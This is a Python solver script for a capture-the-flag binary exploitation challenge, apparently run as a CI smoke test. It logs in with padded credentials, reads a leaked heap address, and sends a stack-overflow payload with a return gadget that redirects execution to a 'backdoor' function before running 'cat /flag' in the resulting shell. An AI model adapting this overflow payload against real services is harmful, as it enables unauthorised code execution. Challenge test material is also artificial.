#!/usr/bin/env python3
import argparse
import pathlib
import re
import socket
import struct
import subprocess
import time

NAME = b"admin\x00" + b"A" * (0x40 - 6)
PASSWORD = b"123456\x00" + b"B" * (0x100 - 7)


def recv_some(sock, delay=0.2, rounds=8):
    time.sleep(delay)
    chunks = []
    for _ in range(rounds):
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
        time.sleep(0.05)
    return b"".join(chunks)


def wait_ready(host, port, timeout):
    deadline = time.time() + timeout
    last_error = "no connection attempt made"
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0) as sock:
                sock.settimeout(0.5)
                banner = recv_some(sock, delay=0.1, rounds=4)
                if b"input your name:" in banner:
                    return
                last_error = f"unexpected banner: {banner!r}"
        except OSError as exc:
            last_error = str(exc)
        time.sleep(1)
    raise RuntimeError(f"service did not become ready within {timeout}s: {last_error}")


def resolve_symbol(binary, name):
    output = subprocess.check_output(["nm", "-an", str(binary)], text=True)
    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] == name:
            return int(parts[0], 16)
    raise RuntimeError(f"symbol {name!r} not found in {binary}")


def resolve_ret_gadget(binary):
    output = subprocess.check_output(["objdump", "-d", str(binary)], text=True)
    in_gift = False
    for line in output.splitlines():
        if "<gift>:" in line:
            in_gift = True
            continue
        if in_gift and not line.strip():
            break
        if in_gift and "\tret" in line:
            return int(line.split(":", 1)[0].strip(), 16)
    raise RuntimeError(f"ret gadget not found in gift() for {binary}")


def exploit(host, port, expected_flag, binary):
    backdoor = resolve_symbol(binary, "backdoor")
    ret_gadget = resolve_ret_gadget(binary)

    with socket.create_connection((host, port), timeout=5.0) as sock:
        sock.settimeout(0.5)

        banner = recv_some(sock)
        if b"input your name:" not in banner:
            raise RuntimeError(f"missing name prompt: {banner!r}")

        sock.sendall(NAME)
        password_prompt = recv_some(sock)
        if b"input your pasword:" not in password_prompt:
            raise RuntimeError(f"missing password prompt: {password_prompt!r}")

        sock.sendall(PASSWORD)
        login_output = recv_some(sock)
        if b"login success!" not in login_output:
            raise RuntimeError(f"login did not succeed: {login_output!r}")

        match = re.search(rb"chunk_addr: (0x[0-9a-fA-F]+)", login_output)
        if not match:
            raise RuntimeError(f"chunk leak missing: {login_output!r}")
        chunk_addr = int(match.group(1), 16)

        payload = (
            b"C" * 0x48
            + struct.pack("<Q", chunk_addr)
            + b"D" * 8
            + struct.pack("<Q", ret_gadget)
            + struct.pack("<Q", backdoor)
        )
        sock.sendall(payload)

        backdoor_output = recv_some(sock, delay=0.4, rounds=12)
        if b"backdoor called" not in backdoor_output:
            raise RuntimeError(f"backdoor was not reached: {backdoor_output!r}")

        sock.sendall(b"cat /flag\nexit\n")
        shell_output = recv_some(sock, delay=0.4, rounds=20)
        if expected_flag.encode() not in shell_output:
            raise RuntimeError(f"flag output mismatch: {shell_output!r}")

        print((banner + password_prompt + login_output + backdoor_output + shell_output).decode("latin1", "replace"))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True, type=int)
    parser.add_argument("--ready-timeout", type=int, default=30)
    parser.add_argument("--expected-flag", default="FLAG{ci_smoke_test}")
    parser.add_argument("--binary", default=None)
    args = parser.parse_args()

    binary = args.binary
    if binary is None:
        binary = pathlib.Path(__file__).resolve().parents[1] / "attachments" / "pwn"
    binary = pathlib.Path(binary)
    if not binary.is_file():
        raise RuntimeError(f"binary not found: {binary}")

    wait_ready(args.host, args.port, args.ready_timeout)
    exploit(args.host, args.port, args.expected_flag, binary)


if __name__ == "__main__":
    main()
